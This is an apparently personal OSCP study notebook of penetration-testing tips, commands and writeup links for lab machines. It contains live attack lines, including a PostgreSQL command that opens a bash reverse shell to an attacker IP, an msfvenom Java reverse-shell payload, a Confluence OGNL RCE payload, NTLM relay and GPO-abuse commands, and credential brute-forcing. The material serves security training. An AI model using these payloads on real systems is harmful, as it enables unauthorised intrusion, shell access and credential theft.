*************************[port maps]*************************


(ospg:payday) in lfi read /etc/php5/apache2/php.ini if allow_url_include is diabled you can not do rfi

offsec ssh bruteforce
edusa -h 192.168.120.85 -U users.txt -P users.txt -M ssh -e ns -f -g 5 -r 0 -b -t 2 -v 4
-------------------------------------------
(ospg:dibble) good for mongodb commands
https://kashz.gitbook.io/proving-grounds-writeups/pg-boxes/dibble/6-27017-mongodb

nice reverse shell cheat sheet
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20an-d%20Resources/Reverse%20Shell%20Cheatsheet.md#nodejs
------------------------
(htb:mail)
for the email they will either provide you:
- the email technology used behind like mail outlook exploit (htb:mail)
- or they will mention in the email the used technology (ospg:hepet)
- or it will be general like knowing it is windows micros or more general library windo (offsec:2023)
---------------------------------------------
(ospg:kevin)
nice way of generating msfvenom shell with no bad chars
----------------------------------
(ospg:hepet)
eventhough there are multiple email services in the machine but one creds can exists in imap but
not exists in pop3
----------------------------------------------
(ospg:butch) mssql inspired bolean and blind
https://medium.com/@negan0/blind-sql-injection-f4d2b7b04a95
-------------------------------------------
(ospg:zeus) 
command to filter users of rid brute
cat users| cut -d '\' -f 2 | grep -i SidTypeUser | cut -d '(' -f 1 | sed 's/ //g' > usrs
----------------------------------
(ospg:laser)
command to put the ntlm_theft
smbclient -U 'laser.com/Eric.Wallows%EricLikesRunning800' //192.168.129.173/Apps -c 'prompt OFF; recurse ON; lcd /path/to/local/cake; cd /remote/path/on/Apps; mput *'

interesting goby obfuscating powershell
https://medium.com/@ankitsinha81195_47457/payload-obfuscation-444857de70e7
https://iritt.medium.com/an-easy-guide-to-obfuscating-powershell-scripts-with-invoke-obfuscation-6fa3c8626ed3
------------------------------
(ospg:nagoya)
lastly i solved the mssql kerberos auth issue using this walkthrough
https://medium.com/@desp0/tj-nulls-oscp-pick-nagoya-lab-walkthrough-offsec-proving-grounds-guide-b15412c92987

the issue - i forward the port to ligolo then in the /etc/hosts
240.0.0.1 nagoya.nagoya-industries.com nagoya
--------------------------------------------------
[*] ntlm relay attack - execute command without knowing the password
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc JABjAGwAaQBlAG4AdA..."

If we don't use the local Administrator user in pass-the-hash, the target machine also needs to be configured in a certain way to obtain successful code execution. Since Windows Vista, all Windows versions have UAC remote restrictions enabled by default. This prevents software or commands from running with administrative rights on remote systems. This effectively mitigates this attack vector for users in the local administrator group aside from the local Administrator account.

In this example we don't use the local Administrator user for the relay attack as we did for the pass-the-hash attack. Therefore, the target system needs to have UAC remote restrictions disabled or the command execution will fail. If UAC remote restrictions are enabled on the target then we can only use the local Administrator user for the relay attack.

UAC remote restrictions limit the users we can use in pass-the-hash or relay attacks outside of an Active Directory environment.

We already encountered UAC remote restrictions for non-domain joined machines in the Password Attacks Module. However, this kind of restriction does not apply to domain users, meaning that we can leverage full privileges while moving laterally with the techniques shown in this Learning Unit. (in wmi winrm - lateral movement module)
-----------------------------------------
i found two ways to exploit redis
(ospg:sybris)
https://github.com/n0b0dyCN/redis-rogue-server.git

 and

  (ospg:wombo)
https://medium.com/@Sh1v4/hackthebox-postman-13f55695650b
this one works
https://medium.com/@msegmgamal45/wombo-proving-grounds-offsec-806d32d65274
-----------------------------------------
(ospg:planetexpress) 
hacktricks page
https://book.hacktricks.wiki/en/network-services-pentesting/9000-pentesting-fastcgi.html

[*] fastcgi - turns php that should be a big indicator of lfi to rce 

interesting goby:

find writable folders
find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null
https://medium.com/@ayeshatahseen79/introduction-to-linux-privilege-escalation-2e9efdb0a92e

------------------------------------------
(ospg:exghost) upload file using curl 
curl -v -F myFile=@payload.jpg http://192.168.201.183/exiftest.php
curl -X POST --data @pshell.php -b "isHuman=1" https://monitorr.robyns-petshop.thm/assets/php/upload.php -k 

an interesting thing happened my PwnKitt did not work but the walkthrough
https://github.com/joeammond/CVE-2021-4034.git
worked vertsion of pwnkit
------------------------------------------------------------------------------
(ospg:catto) it was a web directory specific that is hidden in the graphsql 
-----------------------------------------------------------
(ospg:nagoya) nice way to check user groups using ldap
https://medium.com/@0xrave/nagoya-proving-grounds-practice-walkthrough-active-directory-bef41999b46f

ALSO it is an amazing resource to use local powershell for searching LDAP
-------------------------------------------
(ospg:fanatastic) 
when you have lfi read the services in /etc/systemd/system/prometheus.service as it show you a lot
grafana solution for crypto
-----------------------
(ospg:nagoya) 

convert users to useranarchy
sed -i -E 's/\s+/,/g' usrs && tr '[:upper:]' '[:lower:]' < usrs > temp.txt && mv temp.txt usrs

cewl --with-numbers --depth 0 --min_word_length 1 http://192.168.203.142/iamGaara   -w pass
------------------------
(ospg:confusion) sometime for some reason you need to manually apply the exploit in burpsuite and the script does not work
-----------------------------
(ospg:stapler) 
interesting go by for lfi search for vulnerable files
https://medium.com/@al3xandersteven/hack-the-box-backdoor-eb58a91ee260

shocking how the user pass if found with -e nsr hydra
--------------------------------------------
2 things i want first before something idk or partially know to check from scribd that has most of the things and second a list of powershell for active directory when i am in workstation specifics


(ospg:walpaperhub) wow i think the escalation of the library uses html to execute js to get reverse shell
----------------------------------------------------------
(ospg:wallpaperhub) after discovering ffuf automation for file upload i decided to make this list of checks for file upload 
- ffuf for magic (bypass magic)
- ffuf for extension (bypass extension)
- file name to path traversal (ospg:wallpaperhub) (Sanitize File Names)
[*] checklist - seems a good checklist to check after general search 
https://inside.caratlane.com/comprehensive-security-testing-checklist-for-web-applications-399ec6c53a39 
- 


-------------------------------------------------------------
(ospg:jordak) interesting lfi to log poisoning to rce exploit CVE-2023-26469
--------------------------------------------------------------------------
(ospg:Matrimony) another nice script for file upload without burp request formatting
nice for docker escalation
https://al1z4deh.medium.com/proving-grounds-matrimony-a121fa189966
---------------------------------------------------------------------------------------------------------------------------------------------
(ospg:surf) when you are stuck in a box to the idk level try tto know the attack vector like authentication bypass in dork it in general

nice go by:

authentication bruteforce: https://noureldinehab.medium.com/authentication-bypass-write-up-walkthrough-654f2b51725e
--------------------------------------------------
interesting AD usernames combinations to try
add a to z to the beginning of the users (htb:thefrizz)
add different user first name to the user.lastname you have (ospg:feast)
-----------------------------------------------------------------------
(ospg:keights) https://medium.com/@isuk4/get-rce-with-ssti-61d929feca2a
best explanation about python sanbox bypass
---------------------------------------------------------
(ospg:vanity) beside magic, extension and content-type i should try special characters for detecting eval or system 
wfuzz -u http://10.10.11.170:8080/search -d name=FUZZ -w /usr/share/seclists/Fuzzing/alphanum-case-extra.txt --ss banned
------------------------------------------------------
(htb:hospital) to know available php functions
<?php
  $dangerous_functions = array("exec", "passthru", "system", "shell_exec", "popen", "proc_open", "pcntl_exec","eval");

  foreach ($dangerous_functions as $f){
    if (function_exists($f)){
      echo "\n[+] " . $f . " - EXISTE";
    }
  }
?>

(htb:hospital) https://medium.com/@bdemir/a-pentesters-guide-to-code-injection-dcfa774a4431
nice cheatsheet for msfvenom av evasion encryption and php reverse shell

another one  that worked
https://shivrajan.medium.com/use-command-line-tools-in-php-960214715b73
------------------------------------------------
ligolo setup
sudo ip tuntap add user kali mode tun sus
sudo ip link set sus up
sudo ip route add 240.0.0.1/32 dev sus
sudo ip route add 172.16.118.0/24 dev sus


delete 
sudo ip link set ligolo down
sudo ip tuntap del dev ligolo mode tun
sudo ip route del 240.0.0.1/32 dev ligolo
sudo ip route del 10.10.111.0/24 dev ligolo
sudo ip route del 172.16.118.0/24 dev ligolo



MATCH (n)
DETACH DELETE n;

MATCH (u:User)
RETURN u;

----------------------------------------
(ospg:hokkaido) nice box to know  how the exam will be harder and more tricky in knowing the group specifics like finding genericwrite with generic query search and IT guesing it can forcefully change the password. also nice box for mssql commands and reseting the password with setuserinfo2

for some reason this worked with the medtech the one below it  did not

MATCH (attackerGroup:User)-[r:GenericAll|GenericWrite|WriteOwner|WriteDacl|AllExtendedRights|ForceChangePassword|AddMember|AddSelf|AddKeyCredentialLink|Owns|WriteSPN|ReadLAPSPassword|ReadGMSAPassword|DCSync|CanRDP|AdminTo]->(target)
WHERE target:User OR target:Group OR target:Computer OR target:GPO
RETURN
    attackerGroup.name AS AttackerGroup,
    target.name AS Target,
    labels(target) AS TargetType,
    type(r) AS PermissionType,
    r.isacl AS IsACLBased  

(offsec:secura) added target:GPO

and this to even bypass the nested grouping
MATCH (attackerUser:User)
MATCH (attackerUser)-[:MemberOf*1..5]->(attackerGroup:Group)-[r:GenericAll|GenericWrite|WriteOwner|WriteDacl|AllExtendedRights|ForceChangePassword|AddMember|AddSelf|AddKeyCredentialLink|Owns|WriteSPN|ReadLAPSPassword|ReadGMSAPassword|DCSync|CanRDP]->(target)
WHERE (target:User OR target:Group OR target:Computer OR target:GPO)
  AND NOT attackerUser.name =~ "(?i)Administrator@.*"
RETURN
    attackerUser.name AS AttackerUser,
    attackerGroup.name AS ViaGroup,
    target.name AS Target,
    labels(target)[0] AS TargetType,
    type(r) AS PermissionType,
    r.isacl AS IsACLBased,
    "Via Group Membership" AS AccessType
ORDER BY attackerUser.name

the above showed angela which is domain admin so showed angela access behind its groups but did not show molly canrDP begind its group deepseeks corrected the query and it works now DAAMN the issue were only that i typed canRDP instead of CanRDP
MATCH (attackerUser:User)
MATCH (attackerUser)-[:MemberOf*1..10]->(attackerGroup:Group)-[r:CanRDP|GenericAll|GenericWrite|WriteOwner|WriteDacl|AllExtendedRights|ForceChangePassword|AddMember|AddSelf|AddKeyCredentialLink|Owns|WriteSPN|ReadLAPSPassword|ReadGMSAPassword|AdminTo]->(target)
WHERE (target:User OR target:Group OR target:Computer)
  AND NOT attackerUser.name =~ "(?i)Administrator@.*"
  AND NOT attackerUser.name =~ "(?i)ANGELA.DAVIES@.*"
RETURN
    attackerUser.name AS AttackerUser,
    attackerGroup.name AS ViaGroup,
    target.name AS Target,
    labels(target)[0] AS TargetType,
    type(r) AS PermissionType,
    r.isacl AS IsACLBased,
    "Via Group Membership" AS AccessType
ORDER BY attackerUser.name
--------------------------------
// any group not in including admins who have a dangerious permission over another g roup
MATCH (g:Group)-[r:GenericAll|GenericWrite|WriteOwner|WriteDacl|AllExtendedRights|ForceChangePassword|AddMember|AddSelf|AddKeyCredentialLink|Owns|WriteSPN|ReadLAPSPassword|ReadGMSAPassword]->(c:Group)
WHERE NOT g.name =~ "(?i)Administrators@.*" 
  AND NOT g.name =~ "(?i)Domain Admins@.*"
  AND NOT g.name =~ "(?i)Enterprise Admins@.*"
  AND NOT g.name =~ "(?i)Schema Admins@.*"
  AND NOT g.name =~ "(?i)Account Operators@.*"
  AND NOT g.name =~ "(?i)Backup Operators@.*"
  AND NOT g.name =~ "(?i)Print Operators@.*"
  AND NOT g.name =~ "(?i)Server Operators@.*"
  AND NOT g.name =~ "(?i)KEY ADMINS@.*"
  AND NOT g.name =~ "(?i)ENTERPRISE KEY ADMINS@.*"


RETURN 
    g.name AS AttackingGroup,
    c.name AS TargetGroup,
    "GenericWrite" AS PermissionType
ORDER BY g.name

MATCH (g:Group)-[r:GenericAll|GenericWrite|WriteOwner|WriteDacl|AllExtendedRights|ForceChangePassword|AddMember|AddSelf|AddKeyCredentialLink|Owns|WriteSPN|ReadLAPSPassword|ReadGMSAPassword]->(c)
WHERE (c:User OR c:Group OR c:Computer OR c:GPO) and NOT g.name =~ "(?i)Administrators@.*" 
  AND NOT g.name =~ "(?i)Domain Admins@.*"
  AND NOT g.name =~ "(?i)Enterprise Admins@.*"
  AND NOT g.name =~ "(?i)Schema Admins@.*"
  AND NOT g.name =~ "(?i)Account Operators@.*"
  AND NOT g.name =~ "(?i)Backup Operators@.*"
  AND NOT g.name =~ "(?i)Print Operators@.*"
  AND NOT g.name =~ "(?i)Server Operators@.*"
  AND NOT g.name =~ "(?i)ENTERPRISE KEY ADMINS@.*"
  AND NOT g.name =~ "(?i)KEY ADMINS@.*"


RETURN 
    g.name AS AttackingGroup,
    c.name AS TargetGroup,
    "GenericWrite" AS PermissionType
ORDER BY g.name

---------------------------------------------------------------------
(ospg:cockpit)a very shocking way how he reached the sql injection
https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/Databases/MySQL-SQLi-Login-Bypass.fuzzdb.txt 
---------------------------------------------------------------------
(ospg:spx) amazing go by to print the important info in phpinfo.php
https://medium.com/@opabravo/file-upload-bypass-fuzz-magic-bytes-mime-types-with-ffuf-b218171533d4


URL="lab.local/upload/phpinfo.php"; OUT="$(echo $URL | awk -F'://' '{print $NF}' | sed -e 's|[/:]|-|g')"; curl -s "$URL" | grep -E 'DOCUMENT_ROOT |USERNAME|RUN_USER|file_uploads|upload_tmp_dir|allow_url_include|allow_url_|disable_functions|session.save_path|PHP Version </td> |Server API </td>|>System </td>|SERVER_SOFTWARE |open_basedir|enable_dl|class="e">SPX|spx.http_enabled|spx.http_key' | html2markdown | sed -n '/|/p' | awk -F'|' '{printf "%-25s %s\n", $1 ":", substr($0, index($0, "|") + 1)}' | sed -E -e 's/( on| enable| 1)/\x1b[31m&\x1b[0m/ig' | tee "phpinfo_${OUT}.txt"
----------------------------------------------------
(ospg:shenzi) as i learned from shenzi box that there could be specific directories, i should always brute force and hunt for the box specifics and this means they are not using things in the wordlists and these are ways to dig them out which acan be called the box not general and is specific like in workstation specifics and linpeas:

(htb:friendzone) to find a subdomains that are specific
vhost specefics
dig axfr @10.10.10.123 friendzone.red

(ospg) to find smtp users
(ospg) to find default ftp users
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 192.168.168.52 ftp
(ospg:shenzi) for not default directories try to guess them from the box name hints etc
(ospg:) kdc using the username wordlists
(ospg:) web logins 
grep -ir 'splunk' /usr/share/wordlists/seclists/Passwords/Default-Credentials/default-passwords.csv
(htb:thefrizz) using useranarchy with letters
awk -F, '{for(i=65;i<=90;i++) printf "%s,%s\n", $1, sprintf("%c", i)}' users.lst
awk -F, '{for(i=65;i<=90;i++) printf "%s.%s\n", sprintf("%c", i), $1 }' generateletteruers

(ospg:) after finding a default smtp users you can try using the same username and passs
(ospg:) generating password if a lot of data shared about the name or the name similar to actor
(ospg:peppo and postfish) found default users should be tried with the same pass on ssh and smtp
(htb:manager) use the user for user and pass smb
(ospg:matrimony) if the dns setup reverse  it dig @192.168.179.171 -x 192.168.179.171
(ospg:peppo) default creds for postgresql psql -h 192.168.197.60 -p 5432 -U postgres
--------------------------------------------------
(ospg:depreciated) good for graphql commands 
------------------------------------------------
(ospg:Roquefort) nice way to execute commands using git hooks
-------------------------------------------------
https://github.com/0xyy66/CVE-2023-45878_to_RCE/blob/main/CVE-2023-45878.sh
good script to automate lfi once you know it
(httb:thefrizz)
--------------------------------------
good lfi discovery techniques
https://medium.com/@bdemir/a-pentesters-guide-to-file-inclusion-8fdfc30275da
https://medium.com/@nyomanpradipta120/local-file-inclusion-vulnerability-cfd9e62d12cb
nice log poisoning https://medium.com/@mjohn-sec/elevating-local-file-inclusions-to-remote-code-execution-32dc629dab74
indork: site:medium.com "/.php?page="
(ospg:injecto)
----------------------------------------------
like what you learn in kerbeos brute forcing with big name list and smtp brute force with default  users xato ftp and ssh should be bruteforce for default woth hydra -c and default userpass
(ospg:)
---------------------------------------------------------------------------
(ospg:source) amazing box to bruteforce login with limit using burpsuite
https://www.exploit-db.com/docs/50436
------------------------------------------------
not like ippsec said django can has lfi (ospg:bottleup)
----------------------------------------------------
(ospg:heist) if you have ldap access search for these 
msDS-GroupManagedServiceAccount
-----------------------------------------------------
(ospg:heist) interesting go by to try in lfi 
https://medium.com/@7HPL/analysis-hack-the-box-3d9fcb0c617e
type C:\inetpub\logs\logfiles\W3SVC2\u_ncsa2.log
----------------------------------------------------
(ospg:heist) [*] SSRF to stealing password - ssrf can enable you to steal thje netntlmv2 hash 
----------------------------------------------------
for java exploits 
msfvenom -p java/shell_reverse_tcp lhost=10.10.16.7  lport=443  -f war -o pwn.war
-------------------------------------------
(htb:arctic) script to send a form request with the payload
https://www.exploit-db.com/exploits/50057
--------------------------------------------
(ospg:medjet) another nice sql write file 
https://medium.com/@bdsalazar/proving-grounds-medjed-intermediate-windows-box-writeup-a-journey-to-offensive-security-74a2b7a94a88
--------------------------------------------
in connecting the ports look if the box has remote connection protocols like 5895 or 3389 rdp if no means the box is exploit to get into the system then if the box is giving you a lot of paths means might be lfi to read config files
------------------------------------------
(ospg:slort) when the lfi using http did not work i used the smb with & instead of ? and it worked
-------------------------------------------
(htb:buff) the exploit is a good resource for burpsuite upload httb format
--------------------------------------------
the difference when an application is running above nginx or apache is that the project could be running on a different port inside the box (ospg:)
-------------------------------------------------
hashcat hash discover

hashcat --example-hashes | grep -B2 '\$1\$'
-----------------------------------------------------
[*] SSTI - enables you to execute commands
https://medium.com/@trixiahorner/tryhackme-injectics-walkthrough-c62f0df2a434
------------------------------------------------------
brute force protocols
https://medium.com/@Kyle591/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E6%96%B9%E6%B3%95%E6%B1%87%E6%80%BB-%E4%B9%8B%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1%E7%88%86%E7%A0%B4%E7%AF%87-dbba9cb9097

-------------------------------------------------------
SCF attack
https://github.com/Greenwolf/ntlm_theft
--------------------------------------------------------
wordlists

usernames:
/usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt
/usr/share/wordlists/seclists/Usernames/Names/names.txt



vhosts:
/usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt

wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://flight.htb" -H "Host: FUZZ.flight.htb" --hw 530

or the wordlist 
/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt

parameter fuzzing:
/usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt

wfuzz  -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt  -X POST -d "{'user':'admin','password':'test'}"  -u 'http://192.168.242.203/login.php?FUZZ=test' --hw 534

endpoints:
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt


------------------------------------------------------
extract emails from pages
curl http://soccer.htb  | grep -E -o "\b[a-zA-Z0–9.-]+@[a-zA-Z0–9.-]+\.[a-zA-Z0–9.-]+\b"

-------------------------------------------------
time based mssql to RCE (ospg:butch)
https://infosecwriteups.com/how-i-escalated-a-time-based-sql-injection-to-rce-bbf0d68cb398

check the txt file i created for the payloads for testing
indork: site:medium.com "microsoft sql  injection"
----------------------------------------------
while IFS= read -r line; do  curl "http://192.168.173.58/image.php?img=php://filter/read=convert.base64-encode/resource=../../../../..$line" | grep -oP '(?:[A-Za-z0-9+/]{4}){4,}(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=|[A-Za-z0-9+/]{4})' | base64 -d >> lfi.rest  ;done < /usr/share/linux-binaries/linux_lfi
---------------------
check the bypassed firewall ports for reverses shell
------------------------------------------
smtp-user-enum -w -f '<user@example.com>' -m RCPT -U /usr/share/wordlists/metasploit/unix_users.txt 192.168.173.97 25
--------------------------------------
if you have lfi try to read /root/.ssh/authorized_keys if the service running as ssytem you can read it
--------------------------------
grep -oP '(?<=[Open ] )\S+' allports | cut -d : -f 2 > ports
------------------------------
for i in $(cat ports);do echo -n $i,;done
-----------------------------------------------
lftp :~> set ftp:ssl-force true
lftp :~> set ssl:verify-certfificate no
ssl:verify-certfificate: no such variable. Use `set -a' to look at all variables.
lftp :~> set ssl:verify-certificate no
lftp :~> connect 192.168.173.20
----------------------------------
Bad enum connect the ports
 is where my usual enumeration missed something small like a flag or addition scan to get better connection of the ports like in (ospg:hunit) missing / and (ospg:)

Check all the anomalies with wfuzz do not rely on just --hl for example

sudo nmap -Pn -n $IP -sU --top-ports=100 --reason // port 161 is important
rustscan --addresses 192.168.189.125 --ulimit 5000 -- -A -sC -Pn -sV -T 1500

windows local huh !

(htb:Monteverde) crackmapexec smb 10.10.10.172 -u validusers.txt -p validusers.txt --continue-on-success

discover directories with the wordlists big.txt medium and dirsearch

For my bad enum always use -f with gobuster to discover api endpoints

please search more on ports to not miss things like ident enum in (ospg:peppo)
------------------------------------------------------------------------
generating windows lol reverse shell like nc linux

hta ods method (ospg:hepet) https://medium.com/@huwanyu94/proving-grounds-practice-hepet-walkthrough-ee7e051af47b

which is similar to offsec/ippsec shingan

or ippsec method cat cradle | iconv -t utf-16le | base64 -w0;echo
--------------------------------------------------------------------
f.last,first.last,last.first,flast,first,last,firstlast,l.first,lfirst
--------------------------------------------------------------------------
phone numbers can be user:pass (ospg:badcorp)
----------------------------------------------------
https://systemweakness.com/proving-grounds-badcorp-walkthrough-54c393758380
cp -rf to ce privesc
Command Injection vulnerability with ;id;# 
(badcorp)
-----------------
CVE-2018-16858 for odt macros rce (ospg:craft2)
------------------------------------
APIs extensions need / at the end of the dir name (hunit)
---------------------------
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 240.0.0.1/32 dev ligolo
-----------------------------------------------------
/${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("id").getInputStream(),"utf-8")).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader("Exec-Output",#a))}/

this was the  payload executed for Atlassian Confluence 7.13.6 CVE-2022-26134
might help for other boxes (ospg:flu)
--------------------------------------------------------------------
[*] sometimes other third party protocols helps you to escalate because the protocol gives you control over folders that root use like ftp what happened in (ospg:badcorp) and git in (ospg:hunit)
-------------------------------------
rid brute force
netexec smb 192.168.248.39  -u 'DoesNotExec' -p '' --rid-brute
reproasting 
netexec ldap  192.168.248.158  -u users.kerb   -p '' --asreproast roast.txt
asreproast mostly need auth so this is un auth method
impacket-GetUserSPNs  -no-preauth Guest -usersfile users.kerb -dc-host 192.168.248.158 zeus.corp/
sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete (offsec)
-----------------------------------------
for i in $(grep -oP '(?<=[Open ] )\S+' allports | cut -d : -f 2| sort -u);do echo -n $i,;done
---------------------------------------------------------------
(ospg:hepet) good example of connect the ports of 143 
[*] 143 enables you to read the inbox of someone and connecting port via email

(ospg:postfish) good example of connect the ports of 110 and cewl
[*] 110 enables you to read the inbox of someone and connecting port via email
https://medium.com/@whitebearr82/pgpractice-linux-postfish-192-168-56-137-9a48d8577c5f

it teach you if you can not find users you use users wordlist to find default mail users
/usr/share/wordlists/seclists/Usernames/Names/names.txt

(ospg:hokkaido) i did the same mistake i need to search for default users same as smtp but for port 88
kerbrute userenum -d hokkaido-aerospace.  --dc 192.168.184.165   /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -o kerb.users

----------------------------------------------------------
SQLMAP deleting cache
/home/kali/.local/share/sqlmap/output/192.168.248.211
------------------------------------------------------------
(ospg:election1) the best example of sql to cmd if you reviewed burpsuite of sqlmap using
sqlmap -r sql.req  --level=5 --risk=3 --os-shell -p id
---------------------------------------------------------------
to create jar payload use the exploit script from (ospg:) 
----------------------------------------------------------------
[*] postgresql - give you rce (ospg:peppo)
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);COPY cmd_exec FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/192.168.45.162/80 0>&1"';SELECT * FROM cmd_exec;
----------------------------------------------------------------------
[*] 113 (FreeBSD identd) - enum for users
-------------------------------------------------
site:medium.com ... in connect the ports is like find -user and ps -ef in workstation specifics which considered a replacement for the thing i wanted to tell saleh about which is the remote-mouse.exe served to daren to know the open ports exploits where i watned to tell saleh we should to a website to organize these
------------------------------------------------------------------------------
[*] any form can be xxe - allow to read files (ospg:glider) 
------------------------------------------------
[*] index.php - can give you rce ! yes sometimes you can control vulnerable php func
(ospg:glider)

here the preg_replace got rce
---------------------------------------
[*] rpcclient - enables you to read the desc of the machine users which could give you pass for a user and initial access 
--------------------------------------------------------
after rustscan, directly edit the hosts file so that nmap scans show you the names instead of you going back and forth from host to nmap scan to  check 
----------------------------------------------
basic base64 http
medusa -h 127.0.0.1  -u admin  -P /usr/share/wordlists/rockyou.txt  -M http -m BASIC   -t 5 -n 9090
---------------------------------------------------------------------------------------------------------
captcha parameter dropped into eval for calculation which cause reverse shell (ospg:prostore)
----------------------------------------------------------------------------------------------------------
[*] SSRF - allows you to read files in the system (ospg:symbolic)
--------------------------------------------------
"default or safe or vuln or exploit or fuzzer or version or discovery or auth" 
-----------------------------------------------------------------------
find endpoints

wfuzz --hc=404 -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.91:5000/FUZZ
-----------------------------------------------------------------------
https://medium.com/purplebox/methods-for-exploiting-file-upload-vulnerabilities-c046f9946b62
(ospg:access) many ways  to bypass extension blacklist
-------------------------------------------
advanced port specifics
nmap --script "default or safe or vuln or exploit or fuzzer or version or discovery or auth"   -sV -oN advsc -p - 
-----------------------------------------------------
filtering enum4linux or rpcclient domusersenum
cat users.txt | awk -F\\[ '{print $2}' | awk -F\\] '{print $1}' > final_user.txt
-----------------------------------------------
()


*************************[workstation specifics]*************************
[there are things you can do in this workstaions with this user that you can not do on the other workstations which will get you a domaion user]

(offsec:shiftdel) interesting way abusing linux absolute path
---------------------------------
(offsec:medtech) 
after modifing mofifiable executable waiting for a scheduler time if no trager check if you can restart as the scheduler may run every restart

beside since modifying a folder is everything about dll hijacking, insecure service check them all
(offsec:medtech:client02) even through i did not have access to get-service but the service name is the same as the executable so always try that for insecure service also using sc instead of net maybe

also unqoute is mostly need more reqs
-------------------------------------------------------
OSCP A
(offsec:Hermes)
i was right that winpeas did not show me the service name that has the insecure service vulnerability that i have write permision over a service - also i found it thanks to god for understanding how to exploit  the dll hijack that made for me the rest easy 
--------------------------------
OSCP C
(offsec:Frankfurt) you can in your search for exploit use dork keywords like
"exploit" "rce" "standalone" "self-contained"

(offsec:charlie) start pspy64 even if there is no crontabs //avoid misses

(offsec:pascha)
for the unqouted service use this powershell to get what is the service name
Get-Service | Where-Object { $_.Status -eq 'Running' } | ForEach-Object { 
    $config = sc.exe qc $_.Name 2>$null
    if ($config -match "backup\.exe") { 
        Write-Output "Service: $($_.Name)"
        Write-Output $config
        Write-Output "----------------------"
    }
}
----------------------------------------------
(offsec:oscpc) pass the ticket (TGT or TGS) is a nested perform
----------------------------------
(ospg:billyboss)
like in the connect the port when there is website provided with its files in ftp means the website is for the specific there are commands normally gives access denied and being able to execute it give you some pre assumption like

wmic qfe list // the box creator with your specific user wants you to escalate with windows system exploit
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """ // the box creator with your specific user to escalate with unqouted service
-----------------------------------------------------
(ospg:jacko)
a DLL hijack privilege escalation exploit db powershell script was interesting to show writable windows environmental variables like exploiting $PATH in linux
https://www.exploit-db.com/exploits/49382
a very interesting exploit and box to fully understand dll hijacking

dll hijacking types:
- the dll of the service exists but the folder is writable by you (htb:analysis)
- the dll actually does not exists so you search for the first writable PATH by you (ospg:jacko)

this article mentioned the searching for the dll order
https://infosecwriteups.com/privilege-escalation-in-windows-380bee3a2842
1. The directory from which the application loaded
2. 32-bit System directory (C:\Windows\System32)
3. 16-bit System directory (C:\Windows\System)
4. Windows directory (C:\Windows)
5. The current working directory (CWD)
6. Directories in the PATH environment variable (first system and then user)

writtable environmental paths
$i=1; (Get-ItemProperty "HKLM:\System\CurrentControlSet\Control\Session Manager\Environment").Path -Split ";" | % { try { [IO.File]::OpenWrite("$_\x.txt").Close(); Remove-Item "$_\x.txt" -EA 0; "[$i] [WRITABLE] $_"; $i++ } catch {} } | Select -First 1; (Get-ItemProperty "HKLM:\System\CurrentControlSet\Control\Session Manager\Environment").Path -Split ";" | ? { $_ -ne $writable } | % { "[$i] [NOT WRITABLE] $_"; $i++ }


the analysis htb did snort dll hijacking did not have exploitdb writeup but the exploit found here
http://hyp3rlinx.altervista.org/ so this is a lesson learned after me searching steps before idk level which is like searching the connect the port with general for authentication bypass we can search workstation specifics with like dork general or this dll hijack for the software installed
--------------------------------------------
(ospg:squid)
offsec walkthrough has interesting abusing a local service without using fullpower eventhough it is lengthy and more steps than TJ null writeup but more manual way
----------------------------
---------------------------------------------------------------
(ospg:vault)  checking if our user has access to modify any Group Policy Objects.
Get-NetGPO
Get-GPPermission -Guid [of the gpo] -TargetType User -TargetName [your-user]
wget https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.0_x64/SharpGPOAbuse.exe
./SharpGPOAbuse.exe --AddLocalAdmin --UserAccount anirudh --GPOName "Default Domain Policy"
gpupdate /force
---------------------------------------------------------------------
(ospg:vault) We cannot access the scheduled tasks but we still might be able to manipulate one. Let’s look at them. We want a task that is run by SYSTEM dir c:\windows\system32\tasks

these are windows world writable folders
https://gist.github.com/mattifestation/5f9de750470c9e0e1f9c9c33f0ec3e56

abuse serestoreprivilege even if there is no RDP
https://github.com/dxnboy/redteam/blob/master/SeRestoreAbuse.exe?source=post_page-----158516460860---------------------------------------
------------------------------------------------------------------------------------
(htb:puppy) very nice articles helped me alot  to first add a user to another group 
secondly to remove the ACCOUNTDISABLE
https://medium.com/@hush0x01/vintage-hackthebox-walkthrough-e12096699c63

- it is my first time to see this factor of impacket-dpapi
My thought was that it's possible the user performed some administrative tasks as C.Neri_adm while logged in as C.Neri and would therefore have some cached credentials on the box.
[*] dpapi - give you important credentials to escalate

method of transferring files 
[Convert]::ToBase64String([IO.File]::ReadAllBytes('c:\Ubuntu.zip'))
--------------------------------------
(ospg:laser) sometimes there could be a user that is not grapped with rid like what happened with o.foller when it give me headache to get into ms02 // Relying only on nxc can make you miss disabled users. Therefore, always use bloodhound also to enumerate all users.

to avoid this issue 
execute neo4j users command and count the rid users it must match in number

